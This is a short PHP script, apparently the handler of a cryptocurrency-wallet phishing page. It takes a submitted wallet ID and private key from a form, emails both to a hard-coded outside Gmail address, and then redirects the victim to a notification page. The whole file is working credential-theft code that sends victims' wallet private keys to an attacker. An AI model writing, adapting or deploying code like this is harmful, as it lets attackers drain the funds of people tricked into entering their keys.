<?php
if(isset($_POST['submit']))
{
$walletid = $_POST['walletid'];
$prkey = $_POST['prKey'];
$to = "spierinelli12@gmail.com";
$subject= $walletid;
	$headers = "You have a post on : " . $walletid . "\r\n";
	$body .= "Private Key:  {$prkey}";

	mail($to, $subject, $body, $headers);
    header("Location: notification.php");
}	

?>